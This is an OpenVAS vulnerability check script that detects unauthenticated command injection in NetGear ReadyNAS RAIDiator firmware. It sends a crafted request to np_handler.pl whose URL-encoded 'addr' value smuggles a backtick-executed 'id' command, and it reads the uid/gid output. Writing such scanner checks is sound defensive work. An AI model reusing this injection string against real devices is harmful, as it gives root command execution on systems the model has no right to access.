###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_netgear_readynas_62059.nasl 11 2013-10-27 10:12:02Z jan $
#
# NetGear RAIDiator (ReadyNAS) Cross Site Request Forgery and Command Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103822";

tag_insight = "The NETGEAR ReadyNAS RAIDiator firmware prior to the 4.2.24
release is prone to remote command execution through the FrontView web
interface. An attacker can use an unauthenticated HTTP GET request to execute
arbitrary commands as user 'admin' on the remote NAS device. This
vulnerability exists due to a failure in /frontview/lib/np_handler.pl to
sanitize user-input. Due to various improper file system permissions, the admin
user can execute commands as root.";

tag_impact = "Exploiting these issues may allow a remote attacker to perform certain
administrative actions and execute arbitrary shell commands with root
privileges. Other attacks are also possible.";

tag_affected = "Following are vulnerable:
RAIDiator versions prior to 4.1.12 running on SPARC
RAIDiator-x86 versions prior to 4.2.24";

tag_summary = "NetGear RAIDiator is prone to a cross-site request-forgery
vulnerability and a command-injection vulnerability.";

tag_solution = "Updates are available. Please see the references or vendor advisory
for more information.";

tag_vuldetect = "Send a crafted HTTP GET request which tries to execute the 'id' command.";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(62059);
 script_cve_id("CVE-2013-2751","CVE-2013-2752");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_version ("$Revision: 11 $");

 script_name("NetGear RAIDiator (ReadyNAS) Cross Site Request Forgery and Command Injection Vulnerabilities");

 desc = "
Summary:
" + tag_summary + "

Vulnerability Detection:
" + tag_vuldetect + "

Vulnerability Insight:
" + tag_insight + "

Impact:
" + tag_impact + "

Affected Software/OS:
" + tag_affected + "

Solution:
" + tag_solution;

 script_xref(name:"URL", value:"http://www.securityfocus.com/bid/62059");
 script_xref(name:"URL", value:"http://www.netgear.com");
 
 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-10-25 15:00:37 +0200 (Fri, 25 Oct 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to execute the id command");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 443);
 script_exclude_keys("Settings/disable_cgi_scanning");

 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "affected" , value : tag_affected);
  }

 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");

port = get_http_port(default:443);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if("apache" >!< tolower(banner))exit(0);

host = get_host_name();
url = "/np_handler/";

if(http_vuln_check(port:port, url:url,pattern:"Empty No Support")) {

  cmd = 'id';

  foreach file (make_list("$html_payload_header","$xml_payload_header")) {

    url = '/np_handler/np_handler.pl?OPERATION=get&OUTER_TAB=tab_myshares&PAGE=User&addr=%22%29%3b' + file + '=%28%60' + cmd + '%60%29%3b%23';

    if(buf = http_vuln_check(port:port, url:url,pattern:"uid=[0-9]+.*gid=[0-9]+")) {
      data = 'It was possible to execute the "id" command.\n\nRequest:\n\nhttp://' + host + url + '\n\nResponse:\n\n' + buf + '\n\n';
      security_hole(port:port, data:data);
      exit(0);
    }  

  }

  exit(99);

}  

exit(0);

